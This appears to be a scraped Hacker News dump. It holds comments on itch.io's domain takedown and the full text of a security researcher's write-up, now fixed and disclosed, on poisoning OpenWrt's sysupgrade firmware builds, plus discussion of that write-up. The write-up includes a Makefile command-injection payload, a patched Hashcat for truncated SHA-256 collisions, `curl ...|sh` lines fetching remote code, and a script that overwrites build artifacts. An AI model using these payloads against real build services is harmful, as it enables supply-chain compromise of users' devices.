tomorrow and start the turdification (tm) slide. reply tucnak 11 hours agorootparentprevGandi? reply trissi1996 10 hours agorootparentThey hiked prices massively so I wanted to transfer away, it was a massive shitshow. Auth-codes given on the website were expired and they took 2 weeks to give me the correct ones near the end of the registry period. Support was extremely unresponsive. As this this was a side project I couldn't spent time on every day my domain went into quarantine for a short time. They answered 2 days before the end of the rental period, when requesting the auth codes ~2.5 weeks before. Will never use them again after this experience. Porkbun is my new home for most stuff and domains.lt for .lt which porkbun doesn't offer yet sadly. reply tucnak 9 hours agorootparentWow, I never knew that to be the case! How would I find a registrar that supports .at LTD? Cloudflare, AWS, Google—neither supports it. reply trissi1996 7 hours agorootparentFrom looking through https://www.nic.at/en/my-at-domain/at-partnerfinder the only one that I knew and did not hear shit about seems to be OVH. Others might be good, but no idea who exactly, many small unknown companies in the list that could be either great or shitty. reply tucnak 6 hours agorootparentThanks for Porkbun suggestion, I'll keep that in mind; it doesn't support .at but I'm now tempted to move my other domains there. Gandi used to be good, it's a shame what it's become. reply nouryqt 2 hours agorootparentprevI'm using dynadot for my .at domains reply eps 10 hours agorootparentprevBought by a private equity company. Went back on their contract obligations already, hiked prices, etc. Will be milked to death. Best to consider them dead. reply supermatt 9 hours agorootparentprevgod no - gandi absolutely suck now for both service and price. I moved all my domains to netim. reply jarofgreen 11 hours agorootparentprevThey were sold to another company a year or two ago and now some people are a bit wary reply em-bee 10 hours agorootparenti just moved all my domains off gandi because they doubled or tripled the renewal prices. i am guessing they are milking their existing customers who don't notice or don't have the knowhow or resources to move their domains, and once those wise up to that they will lose a lot of them apart from prices their operation didn't seem to change after the sale. although i only have a few domains so i probably didn't interact with them enough to notice anything else reply InsideOutSanta 10 hours agorootparentDamn, that's good info. I have all my domains on Gandi and noticed the pricing changes, but I just stupidly assumed that it was something the registry operators were causing. Sucks to have to leave Gandi, their UX is great, no stupid upselling, very clear website. reply buro9 10 hours agorootparentprevI've been doing this too, every time a renew comes around I shift it to Namecheap. reply NetOpWibby 10 hours agorootparentprevI've noticed that Gandi has become SUPER expensive as opposed to Hover lately as well. I'm just letting domains expire instead. reply input_sh 10 hours agorootparentOne of my domains on Gandi was up for renewal. I've noticed they charged ~$140, while Namecheap charged ~$35. Easiest transfer decision I've ever made. reply em-bee 9 hours agorootparentwow that's 4 times as expensive!! seems like gandi didn't just multiply the prices but raised them exponentially. beware of namecheap though. see https://news.ycombinator.com/item?id=42364240 reply input_sh 6 hours agorootparentI've read my fair share of Namecheap criticisms over the years and remain unconvinced. I point my nameservers somewhere else and then forget about Namecheap for a year. reply weinzierl 10 hours agorootparentpreveasyDNS (not to be confused with DNSEasy or DNS Made Easy). Very happy customer for many years and there are not many companies I can say that about. If you are in Germany donaindiscount24.com is good option too. reply clan 9 hours agorootparentBeware! The OP was originally at a good provider which got bought out by Team Internet. See: https://news.ycombinator.com/item?id=42364033 If you take a look at: https://www.domaindiscount24.com/en/about-us You will see that Team Internet owns them as well. So I would personally bve on the fence if I would consider them good or not. reply TZubiri 11 hours agorootparentprevWhat's wrong with aws lmao reply bigstrat2003 10 hours agorootparentNothing. He said that they are one you should use. reply seanthemon 10 hours agorootparentprevI've been using namecheap for over a decade and have had zero issues with them. reply Animats 10 hours agoprevHm. So Funko sells merchandise related to the Jurassic World franchise.[1] But, according to Licensing International, Mattel licenses the toy rights to that franchise from Universal Products and Experiences, the merchandise arm of Universal Pictures. [2] Also, Funko sells Disney Princess dolls.[3] Mattel announced a multi-year licensing deal with Disney to license the doll rights for Disney Princess dolls. “The courage and compassion found throughout our Disney Princess and Frozen stories and characters continue to inspire fans around the globe,” said Stephanie Young, President of Disney Consumer Products, Games and Publishing. “By furthering our longstanding relationship with Mattel, we look forward to expanding the worlds of Disney Princess and Frozen, introducing an innovative new era of these beloved franchises through captivating products and play opportunities.” Might be useful to send letters to Disney's and Mattel's legal departments. Mattel paid a lot of money for that Disney license. Disney is very protective of those licenses. Mattel lost the Disney license to Hasbro for a few years due to overproduction of low quality dolls. I'm surprised to see Funko selling low-quality Disney dolls. They degrade a Disney brand. [1] https://funko.com/pop-tyrannosaurus-rex-fossil/80225.html [2] https://licensinginternational.org/news/mattel-and-universal... [3] https://funko.com/fandoms/animation-cartoons/disney-princess... [4] https://corporate.mattel.com/news/mattel-and-disney-announce... reply Freak_NL 8 hours agoparentWhy on earth would you send letters? These are all huge corporations with sizeable legal departments. They either know or they should, and most importantly, are paid to handle this. Moreover, you're not likely to be heard or understood by the first line of customer care there, even if this was something they weren't aware of (quite unlikely) but wished they were. It's a waste of time, and something even the biggest altruist would find hard to defend as a sensible effort. Besides, Disney is perfectly capable of degrading their own brand. reply OrangeMusic 3 hours agorootparentI think OP's plan wasn't to help Disney, but to hurt Funko? But I agree this is most probably futile :) reply therealcamino 7 hours agoparentprevI think Funko's products are classified as collectibles, not dolls. I am sure they have licenses from Disney. reply jerf 4 hours agorootparentFunko still exists, ergo, they have licenses from Disney. Disney chases down little daycare centers: https://www.snopes.com/fact-check/daycare-center-murals/ They would not miss Funko. reply dawnerd 2 hours agoparentprevDisney and Universal license and even sell Funko in their parks. But what you did discover is why some are bobble heads. reply nicoloren 9 hours agoprevI've experienced the same thing: a YouTube channel deleted without any explanation (the email from Google mentioned spam, even though I filmed all the videos myself), Facebook preventing me from sharing posts from a website (without any explanation), and of course, domain names that get deindexed from Google without any reason (no message in Google Search Console). I believe we've reached a point where any activity on the web can vanish overnight due to an AI or an algorithm making decisions based on obscure criteria. reply subarctic 8 hours agoparentI mean at least those are walled garden platforms where this sort of thing we've come to expect. An independent website as big as itch.io going down because of a bogus complaint is a big surprise reply CobrastanJorji 10 hours agoprevQuestion to lawyers: is there a colorable lawsuit against Funko and/or Brand Shield if itch.io can demonstrate quantifiable lost revenue for those N days of being offline? reply lmm 10 hours agoparentGiven that this was apparently a false (and recklessly so, though that's going to be the hard part) report of fraud/phishing and not a DMCA takedown, yeah that sounds like tortious interference. reply leonard-somero 9 hours agoprevI am Leonard Somero, I run verysoftwares.itch.io. I have over 300 followers and a game with 20k+ plays that has been repeatedly featured on the front page. This certainly changed my morning routine! I am glad to hear that the reason wasn't me deleting my Twitter from my page. My first panic reaction was thinking it was me who's caused it, due to some kind of ad revenue conflict. Ever seen the movie Summer Wars? I felt like the protagonist for a moment there, but glad it turns out it was just some 2020s AI nonsense. Either way, there's surely an engineer somewhere who's very busy right now. reply Shank 8 hours agoparent> Ever seen the movie Summer Wars? I felt like the protagonist for a moment there, but glad it turns out it was just some 2020s AI nonsense. Love Machine was a rouge AI in Summer Wars, though. reply gessha 5 hours agorootparentRouge or rogue :D reply teddyh 7 hours agoprevLike I frequently¹ advise²: Don’t look to large, well-known registrars. I would suggest that you look for local registrars in your area. The TLD registry for your country/area usually has a list of the authorized registrars, so you can simply search that for entities with a local address. Disclaimer: I work at such a small registrar, but you are not in our target market. 1.2.reply CM30 7 hours agoprevIt should be illegal for any company to rely on AI or automation to handle legal risks, especially without any human driven support to fall back on. The fact we're handling over things this serious to unreliable and poorly configured systems feels like absolute insanity to me. Also, why is the domain registrar even being contacted here? I thought the general idea was that you'd first contact the site owner and wait for a response, and if there's no response in a certain amount of time, then you might contact the registrar or something. No one should be going over the heads of website owners and creators for matters like this, especially not as their first resort. In a logical world, they'd contact Itch.io and Itch.io would take down the page (which they did), and that would be it. No need to involve the registrar at all in a case like this one. reply haunter 10 hours agoprevSlight off topic but interesting that the post has similar interaction stats (replies and reposts/quotes) between Twitter and Bluesky except the likes which are 3x higher on the former https://files.catbox.moe/82x7ue.jpeg reply huhtenberg 7 hours agoparentBlueSky seems to be far less like-oriented. They aren't just a good metric of engagement there. People read and move on. If it might be helpful to others, they will repost, and that's it. Besides, with 26K followers on BlueSky vs 173K on Twitter, I'd say the engagement on the former is significantly higher any way. reply robin_reala 10 hours agoparentprevLuckily with Bluesky you can link to a post and everyone can see the replies. reply Retr0id 10 hours agorootparentFor now! The bluesky URL contains \"itch.io\" (their handle), and under atproto, DNS name resolution is actually an integral part of handle resolution. It will start 404ing if/when relevant caches expire. This one uses the \"DID\", not the handle, and will not 404: https://bsky.app/profile/did:plc:oy37ivqnriw6nx3lrbcht2u3/po... (cc dang) Open issue regarding making bsky URLs less fragile while also not looking ugly: https://github.com/bluesky-social/social-app/issues/1221 reply peckemys 10 hours agorootparentI think GP comment meant that when you link to a Twitter thread, logged-out users will only see the single post without any replies. On Bluesky, you can see the whole thread. reply Retr0id 10 hours agorootparentRight, and I meant that in the near future you may see no thread at all on bluesky, depending on when the relevant caches expire. reply oneeyedpigeon 10 hours agoparentprevInteresting - most Bluesky accounts, especially those related to gaming, are reporting higher engagement stats on Bluesky, at least relatively if not absolutely. reply blitzar 9 hours agorootparentMy crypto spam scam bot gets far higher engagement on twitter. reply Etheryte 9 hours agorootparentWell of course, your bot is having a wonderful time interacting with other bots. A whole bunch of resources wasted while making everything worse for real humans. reply tbatchelli 3 hours agorootparentThis is a fair description of our future. I’m stealing it reply Etheryte 2 hours agorootparentSee also: the Dead Internet Theory [0]. [0] https://en.wikipedia.org/wiki/Dead_Internet_theory reply rsynnott 8 hours agorootparentprevOh, they've made it to bluesky now as well, unfortunately. (Though, if you use a moderation service which flags/hides accounts with AI generated imagery, that's close to 100% effective for catching crypto scam stuff. Apparently, your average crypto scammer just can't resist a bit of AI-generated banner.) reply MortyWaves 9 hours agorootparentprevThanks for making the internet shittier reply smitelli 5 hours agorootparen",
    "originSummary": [],
    "commentSummary": [
      "Itch.io's domain was disabled due to a false fraud and phishing report by BrandShield concerning a fan page for a Funko Pop game.- The incident underscores issues with automated trademark enforcement and the lack of human oversight, as well as the slow response from the registrar, iwantmyname.- The situation has sparked user support for itch.io and criticism of the parties involved in the takedown."
    ],
    "points": 948,
    "commentCount": 387,
    "retryCount": 0,
    "time": 1733728759
  },
  {
    "id": 42363102,
    "title": "Compromising OpenWrt Supply Chain",
    "originLink": "https://flatt.tech/research/posts/compromising-openwrt-supply-chain-sha256-collision/",
    "originBody": "Compromising OpenWrt Supply Chain via Truncated SHA-256 Collision and Command Injection Posted on December 6, 2024 • 11 minutes • 2240 words Table of contents Introduction Hello, I’m RyotaK (@ryotkak ), a security engineer at Flatt Security Inc. A few days ago, I was upgrading my home lab network, and I decided to upgrade the OpenWrt on my router.1 After accessing the LuCI, which is the web interface of OpenWrt, I noticed that there is a section called Attended Sysupgrade, so I tried to upgrade the firmware using it. After reading the description, I found that it states it builds new firmware using an online service. At this point, I was curious about how it works, so I decided to investigate about it. sysupgrade.openwrt.org After some research, I found that the online service mentioned above is hosted at sysupgrade.openwrt.org. This service allows users to build a new firmware image by selecting the target device and the desired packages. When the user tries to upgrade the firmware, OpenWrt on the user side sends a request to the server with the required information including: Target architecture Device profile Selected packages The server then builds the firmware image based on the information and sends it back to the OpenWrt, which then flashes the firmware image to the device. As you can imagine, building an image with user-provided packages can be dangerous. If the server is building the user-provided source code and is not properly isolated, it can be easily compromised. So, I started to investigate if there were any security issues in the service. Command injection Fortunately, the server hosted at sysupgrade.openwrt.org is an open-source project, and the source code is hosted at openwrt/asu . I’ve set up the local instance of the service to investigate further and test the behavior of the service without impacting the production environment. After reading it a bit, I found that the server is using the containers to isolate the build environment like the following: asu/build.py line 154-164 container = podman.containers.create( image, command=[\"sleep\", \"600\"], mounts=mounts, cap_drop=[\"all\"], no_new_privileges=True, privileged=False, networks={\"pasta\": {}}, auto_remove=True, environment=environment, ) I thought that it would be fun to escape the container, so I started to investigate further to find a way to do so. Shortly after, I spotted the following line in the source code: asu/build.py line 217-226 returncode, job.meta[\"stdout\"], job.meta[\"stderr\"] = run_cmd( container, [ \"make\", \"manifest\", f\"PROFILE={build_request.profile}\", f\"PACKAGES={' '.join(build_cmd_packages)}\", \"STRIP_ABI=1\", ], ) The Makefile referenced above is from the imagebuilder of OpenWrt, and the manifest target is defined as follows: target/imagebuilder/files/Makefile line 325-335 manifest: FORCE$(MAKE) -s _check_profile$(MAKE) -s _check_keys(unset PROFILE FILES PACKAGES MAKEFLAGS; \\$(MAKE) -s _call_manifest \\ $(if $(PROFILE),USER_PROFILE=\"$(PROFILE_FILTER)\") \\ $(if $(PACKAGES),USER_PACKAGES=\"$(PACKAGES)\")) As the make command expands the variable before executing the command, variables that contain the user-controlled value can’t be used securely with it. For example, the following Makefile with make var=\"'; whoami #\" will execute the whoami command despite the variable var is quoted in the single quotes. test:echo '$(var)' Since the PACKAGES variable contains the packages parameter from the request sent by the user, an attacker can execute an arbitrary command in the imagebuilder container by sending a package like `command to execute`. asu/build_request.py line 59-70 packages: Annotated[ list[str], Field( examples=[[\"vim\", \"tmux\"]], description=\"\"\" List of packages, either *additional* or *absolute* depending of the `diff_packages` parameter. This is augmented by the `packages_versions` field, which allow you to additionally specify the versions of the packages to be installed. \"\"\".strip(), ), ] = [] While the container that the command is executed in is isolated from the host, it’s still a good starting point to escape the container.2 SHA-256 collision After finding the command injection above, I was looking for a piece to escape the container. About an hour later, I came across the following code: asu/util.py line 119-149 def get_request_hash(build_request: BuildRequest) -> str: \"\"\"Return sha256sum of an image request Creates a reproducible hash of the request by sorting the arguments Args: req (dict): dict containing request information Returns: str: hash of `req` \"\"\" return get_str_hash( \"\".join( [ build_request.distro, build_request.version, build_request.version_code, build_request.target, build_request.profile.replace(\",\", \"_\"), get_packages_hash(build_request.packages), get_manifest_hash(build_request.packages_versions), str(build_request.diff_packages), \"\", # build_request.filesystem get_str_hash(build_request.defaults), str(build_request.rootfs_size_mb), str(build_request.repository_keys), str(build_request.repositories), ] ), REQUEST_HASH_LENGTH, ) This method is used to generate a hash of the request, and the hash is used as the cache key of the builds. When I saw this, I wondered why it has several inner hashes instead of using the raw string. I checked the code that calculates the hash for packages: asu/util.py line 152-164 def get_str_hash(string: str, length: int = REQUEST_HASH_LENGTH) -> str: \"\"\"Return sha256sum of str with optional length Args: string (str): input string length (int): hash length Returns: str: hash of string with specified length \"\"\" h = hashlib.sha256(bytes(string or \"\", \"utf-8\")) return h.hexdigest()[:length] [...] def get_packages_hash(packages: list[str]) -> str: \"\"\"Return sha256sum of package list Duplicate packages are automatically removed and the list is sorted to be reproducible Args: packages (list): list of packages Returns: str: hash of `req` \"\"\" return get_str_hash(\" \".join(sorted(list(set(packages)))), 12) I immediately noticed that the length of the hash is truncated to 12, out of 64 characters. 12 characters are equivalent to 48 bits, and the key space is 2^48 = 281,474,976,710,656, which seems to be too small to avoid collisions. While this hash isn’t used as the cache key, the outer hash that includes this hash is used. So, by creating a collision of the packages’ hash, we can produce the same cache key even if the packages are different. This allows an attacker to force the server to return the wrong build artifact for requests that have different packages. As I was unsure if the collision was actually possible, I decided to test it by brute-forcing the SHA-256 to find a 12-character collision. Brute-forcing the SHA-256 Since I couldn’t find the hash brute-forcing tools with partial match support, I started to implement it by myself. After some trial and error, I successfully made an OpenCL program to perform the brute-forcing on the GPU. However, upon testing it, the performance was terrible, it takes 10 seconds to calculate 100 million hashes. This was mostly equivalent to the hash rate of the CPU, and as I had never written an OpenCL program before, I couldn’t optimize it further. So, I ended up using the known hash brute-forcing tool program called Hashcat . With the following little hack, I was able to make the Hashcat print the hashes with only 8 characters matched. diff --git a/OpenCL/m01400_a3-optimized.cl b/OpenCL/m01400_a3-optimized.cl index 6b82987bb..12f2bc17a 100644 --- a/OpenCL/m01400_a3-optimized.cl +++ b/OpenCL/m01400_a3-optimized.cl @@ -165,7 +165,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO /** * reverse */ - +/* u32 a_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[0]; u32 b_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[1]; u32 c_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[2]; @@ -179,7 +179,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev); SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev); SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev); - +*/ /** * loop */ @@ -279,7 +279,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO w7_t = SHA256_EXPAND (w5_t, w0_t, w8_t, w7_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, b, c, d, e, f, g, h, a, w7_t, SHA256C37); w8_t = SHA256_EXPAND (w6_t, w1_t, w9_t, w8_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, a, b, c, d, e, f, g, h, w8_t, SHA256C38); - if (MATCHES_NONE_VS (h, d_rev)) continue; + //if (MATCHES_NONE_VS (h, d_rev)) continue; w9_t = SHA256_EXPAND (w7_t, w2_t, wa_t, w9_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, h, a, b, c, d, e, f, g, w9_t, SHA256C39); wa_t = SHA256_EXPAND (w8_t, w3_t, wb_t, wa_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, g, h, a, b, c, d, e, f, wa_t, SHA256C3a); @@ -289,7 +289,8 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO we_t = SHA256_EXPAND (wc_t, w7_t, wf_t, we_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, c, d, e, f, g, h, a, b, we_t, SHA256C3e); wf_t = SHA256_EXPAND (wd_t, w8_t, w0_t, wf_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, b, c, d, e, f, g, h, a, wf_t, SHA256C3f); - COMPARE_S_SIMD (d, h, c, g); + //COMPARE_S_SIMD (d, h, c, g); + COMPARE_S_SIMD (a, a, a, a); } } diff --git a/src/modules/module_01400.c b/src/modules/module_01400.c index ab002efbe..03549d7f5 100644 --- a/src/modules/module_01400.c +++ b/src/modules/module_01400.c @@ -11,10 +11,10 @@ #include \"shared.h\" static const u32 ATTACK_EXEC = ATTACK_EXEC_INSIDE_KERNEL; -static const u32 DGST_POS0 = 3; -static const u32 DGST_POS1 = 7; -static const u32 DGST_POS2 = 2; -static const u32 DGST_POS3 = 6; +static const u32 DGST_POS0 = 0; +static const u32 DGST_POS1 = 0; +static const u32 DGST_POS2 = 0; +static const u32 DGST_POS3 = 0; static const u32 DGST_SIZE = DGST_SIZE_4_8; static const u32 HASH_CATEGORY = HASH_CATEGORY_RAW_HASH; static const char *HASH_NAME = \"SHA2-256\"; Then, I wrapped it with a small script to check if the output from Hashcat contains the 12-character collision. Combining both attacks To combine both attacks, we need to find a payload that has the 12-character hash collision against the legitimate package list. I’ve gathered the package list from the firmware-selector.openwrt.org, which is a frontend of the sysupgrade.openwrt.org, and calculated the legitimate hash: $ printf 'base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd'sha256sum 8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb - The first 12 characters of this hash are 8f7018b33d94, so we need to find a command injection payload that has the same prefix for the hash. To find such a payload, I executed the modified version of the Hashcat on RTX 4090 with the following command: $ ./hashcat -m 1400 8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb -O -a 3 -w 3 '`curl -L tmp.ryotak.net/?l?l?l?l?l?l?l?l?l?l|sh`' --self-test-disable --potfile-disable --keep-guessing After executing the command, Hashcat started to calculate hashes at the speed of around 500 million hashes per second, so I left it running. When I checked the output after a while, the Hashcat calculated all possible patterns, but it didn’t find 12-character collisions. This was because I calculated the space of ?l?l?l?l?l?l?l?l?l?l wrongly. ?l is a mask pattern that generates a-z, so the space of ?l?l?l?l?l?l?l?l?l?l (10 characters) is 26^10 = 141,167,095,653,376, which is about half of 2^48 = 281,474,976,710,656. But, while calculating the space, I incorrectly calculated it as 26^11 = 3,670,344,486,987,776, and thought that it should be enough to find the collision. So, I fixed the mask pattern to ?l?l?l?l?l?l?l?l?l?l?l (11 characters) and left it running again. After executing the command, I wondered if I could make the brute-forcing faster, so I started to poke the Hashcat. Soon, I noticed that the performance drastically increased when I moved the mask pattern to the start of the command like `?l?l?l?l?l?l?l?l?l?l?l `curl -L tmp.ryotak.net/|sh` With a bit of testing, I confirmed that I can increase the speed about 36 times by simply changing the pattern to the following: `?l?l?l?l?l?l?l?l?l?l?l||curl -L tmp.ryotak.net/8f7018b33d94|sh` By using this pattern, the Hashcat was able to calculate the hashes at the speed of 18 billion hashes per second. Within an hour, the Hashcat found the 12 characters collision: $ printf '`slosuocutre||curl -L tmp.ryotak.net/8f7018b33d94|sh`'sha256sum 8f7018b33d9464976ab199f100812d2d24d5e84a76555c659e88e0b6989a4bd8 - Sending this payload as the packages parameter, the command injection is triggered and the script from tmp.ryotak.net is executed. I placed the following script in tmp.ryotak.net/8f7018b33d94, which overwrites the artifact produced by the imagebuilder. cat >> /builder/scripts/json_overview_image_info.py <<PY import os files = os.listdir(os.environ[\"BIN_DIR\"]) for filename in files: if filename.endswith(\".bin\"): filepath = os.path.join(os.environ[\"BIN_DIR\"], filename) with open(filepath, \"w\") as f: f.write(\"test\") PY Then, as the hash collision occurred, the server returns the overwritten build artifact to the legitimate request that requests the following packages: base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd By abusing this, an attacker could force the user to upgrade to the malicious firmware, which could lead to the compromise of the device. Reporting the issue After confirming the attack, I reported the issue to the OpenWrt team via the private vulnerability reporting on GitHub . Soon after acknowledging the issue, they stopped the sysupgrade.openwrt.org service temporarily and investigated the issue. Within 3 hours, they released the fixed version and restarted the service. While both issues are fixed by the OpenWrt team, it was unknown if this attack was exploited by someone else because this vulnerability existed for a while. So, they decided to release an announcement to notify the users to ensure no devices are compromised and detect if it was compromised. Conclusion In this article, I explained how I could compromise the sysupgrade.openwrt.org service by exploiting the command injection and the SHA-256 collision. As I never found the hash collision attack in a real-world application, I was surprised that I could successfully exploit it by brute-forcing hashes. I appreciate the effort of the OpenWrt team to fix the issues in an incredibly short time and notify the users promptly. Shameless plug At Flatt Security, we specialize in providing top-notch security assessment and penetration testing services. To celebrate the update of our brand new English web pages, you can currently receive a month-long investigation by our elite engineers for just $40,000! We also offer a powerful security assessment tool called Shisho Cloud, which combines Cloud Security Posture Management (CSPM) and Cloud Infrastructure Entitlement Management (CIEM) capabilities with Dynamic Application Security Testing (DAST) for web applications. If you’re interested in learning more, feel free to reach out to us at https://flatt.tech/en . OpenWrt is a Linux-based firmware for embedded devices, especially popular for routers. It supports a wide range of devices and is widely used for home routers. ↩︎ Also, this command injection itself is a vulnerability because the produced binary is signed with the private key in the later step. ↩︎",
    "commentLink": "https://news.ycombinator.com/item?id=42363102",
    "commentBody": "Compromising OpenWrt Supply Chain (flatt.tech)473 points by udev4096 14 hours agohidepastfavorite73 comments dhx 9 hours agoA vulnerability not mentioned in the article is the normalisation of executing code that has been especially targeted to a specific user or specific device with no validation of reproducibility and no ability for anyone to verify this custom build and download service hasn't been generating backdoored builds. One should want to ensure use of the same build of xz-utils that Andres Freund is using, or at least a build of xz-utils that other security researchers can later obtain to figure out whether supply chain implants are present in open source software[1]. There's a write up at Mozilla[2] from years ago describing an abandoned attempt by Mozilla to ensure their release builds are publicly logged in a Merkle tree. Google has written up their implementation for Pixel firmware builds but apps delivered through the Google Play Store seem to be vulnerable (unless there is another log I have been unable to find).[3] Apple is seemingly worse than Google on binary transparency with Apple's firmware and app distribution system targeting builds to individual devices with no transparency of builds. For an example of binary transparency done well, Gentoo's ebuild repository (being a single Git repository/Merkle tree containing source checksums) possibly remains the largest and most distributed Merkle trees of open source software. [1] Post xz-utils backdoor, some researchers (including some posting to oss-security about their efforts) undertook automated/semi-automated scans of open source software builds to check for unexplained high entropy files which could contain hidden malicious code. This is not possible to achieve with customised per-user/per-device builds unless every single build is made publicly available for later analysis and a public log (Merkle tree) accompanies those published builds. [2] https://wiki.mozilla.org/Security/Binary_Transparency [3] https://developers.google.com/android/binary_transparency/ov... reply tristor 2 hours agoparentThis is a nice idea, and one I also advocate for, however it's important to keep in mind that the idea of reproducibility relies on determinism. So much of what goes into a build pipeline is inherently nondeterministic, because we're making decisions at compile time which can differ from compilation run to compilation run, setting aside flags. In fact, that's the point of an optimizing compiler, as many reproducible build projects have discovered, turning on optimizations pretty much guarantees no reproducibility. reply actionfromafar 2 hours agorootparentAs long as the compiler is not optimizing by \"let's give this 3 seconds of solving time, then continue if no better solution is found\", then optimizing is not inherently nondeterministic. reply CorrectHorseBat 2 hours agorootparentprevCounterpoint: Archlinux is 89% reproducible with optimizations enabled. The only thing I see which is difficult to make reproducible is optimizations with a timeout. reply not2b 1 hour agorootparentInstead of using a timeout, an optimization that can must be cut off if the cost is excessive can keep some kind of operation or size count, where the count is strictly a function of the input. For example, an optimization based on binary decision diagrams (BDDs) can put a ceiling on the number of nodes in the BDD. reply kccqzy 1 hour agoparentprevYeah I remember Google's certificate transparency team basically designing firmware transparency for all of Linux (not just Android) as well. reply jojobas 5 hours agoparentprevUsing a build service like that is apriori saying \"i'm not valuable enough for a targeted attack\". reply dist-epoch 6 hours agoparentprev> automated/semi-automated scans of open source software builds to check for unexplained high entropy files which could contain hidden malicious code that's easily defeated though, you just \"spread-out\" the entropy. reply dhx 3 hours agorootparentIt's easy to defeat right now because very few are currently thinking about secure build systems. As an example, systemd's latest source tarball has two Web Open Font Format (WOFF) files in a documentation folder, a favicon.png, two few small screenshots and error messages that have unexplained 128bit identifiers. There are also translated strings (PO files) which could include obscure writing systems few can quickly audit, and thus could be advantageous to an attacker wanting to hide malicious code. The problem with most build systems is the entire source tarball is extracted into a single location and any build scripts executed during build have access to everything in the source tarball. Gentoo's portage does apply sandboxing around an entire build process, just not internally between the different build stages. Continuing the Gentoo example (being one of the better examples of sandboxed builds), ideally src_unpack could take a compressed tarball distributed from an upstream project and split files into multiple separate paths such as: - source code files and build scripts needed to build binaries - supporting test files needed to test the the built binaries - supporting documentation/binary/high entropy data such as application icons, game data, documentation, etc that should be copied upon installation but aren't required to build binaries Then src_prepare, src_configure, src_compile, src_test and src_install all have different sandbox configurations restricting which types of files separated during src_unpack each build phase can interact with. For the systemd example above, some possible improvements could be: 1. Remove WOFF font files and use system default fonts, omit favicon.png and omit screenshots. Or only make WOFF font files, favicon.png and screenshots available for copying during the src_install phase, and ensure they are not readable by build scripts during src_configure and src_compile. 2. Generate error message identifiers using an explained approach such as hash_algorithm(\"systemd_error_\" + name_of_error_constant) to generate nothing-up-my-sleeve identifiers. 3. Only provide access to and include in the build process any translation files of languages the user cares about. Or only make translation files available for copying during the src_install phase and possibly src_test too, and ensure they are not readable by build scripts. These build system security techniques are obviously more work, but are generally straightforward to understand and implement. These technqiues are in the realm of possibility for smaller embedded Linux systems that may just be kernel + BusyBox + a few small scripts + a bespoke application + a handful of dynamic libraries. And for more complex Linux systems, these techniques are within the realm of possibility when targeted towards high value software, such as software requiring or often executed with root permissions and software requiring simultaneous access to the Internet and access to user files. reply BoppreH 8 hours agoprevIsn't the \"\".join also dangerous? get_str_hash( \"\".join( [ build_request.distro, build_request.version, build_request.version_code, build_request.target, ... You can shift characters between adjacent fields without changing the hash. Maybe you cannot compromise the system directly, but you could poison the cache with a broken image, or induce a downgrade. reply blueflow 8 hours agoparentYes, one should use a hmac for hashing multiple inputs, for the reason you explained. Edit: s/hmac/incremental hashing/ reply BoppreH 8 hours agorootparentNot quite. HMAC helps to prevent length extensions attacks (if the underlying hash was vulnerable in the first place), and the secret prevents attackers from predicting the hash value (like OP did). But HMAC doesn't help against ambiguously encoded inputs: hmac(key, 'aa'+'bb') == hmac(key, 'aab'+'b') You want a way to unambiguously join the values. Common solutions are: - prepending the length of each field (in a fixed number of bytes); - encoding the input as JSON or other structured format; - padding fields to fixed lengths; - hashing fields individually, then hashing their concatenation; - use TupleHash, designed specifically for this case: https://www.nist.gov/publications/sha-3-derived-functions-cs... reply __david__ 40 minutes agorootparentWouldn’t “x”.join(…) be enough? reply blueflow 34 minutes agorootparentPossibly not: \"x\".join({'aa'+'bxb'}) == \"x\".join({'aaxb','b'}) The separator should not be able to show up in the inputs. reply blueflow 8 hours agorootparentprevYeah i confused hmac's with incremental hashing, i use both at once. reply agwa 7 hours agorootparentprevWhat do you mean by \"incremental hashing\"? Note that the Init-Update-Finalize API provided by many cryptography libraries doesn't protect against this - calling Update multiple times is equivalent to hashing a concatenated string. reply blueflow 7 hours agorootparentI mean the same what you call Init-Update-Finalize. link needed about the dysfunctional implementations. reply vsl 5 hours agorootparentNo, these APIs are intentionally designed to be equivalent to hashing all data at once - i.e. to make it possible to hash in O(1) space. There's nothing \"disfunctional\" about that. \"Incremental hash function\" has a very different meaning and doesn't seem to have any relevance to what is discussed here: https://people.eecs.berkeley.edu/~daw/papers/inchash-cs06.pd... reply blueflow 5 hours agorootparentI guess the PHP documentation is wrong then. Look at this: https://www.php.net/manual/en/function.hash-init.php reply Thorrez 4 hours agorootparentThat page includes an example that shows PHP's incremental hashing is what you describe as \"dysfunctional\". It hashes \"The quick brown fox jumped over the lazy dog.\" in 1 part, and in 2 parts, and shows that the resulting hashes are equal. reply 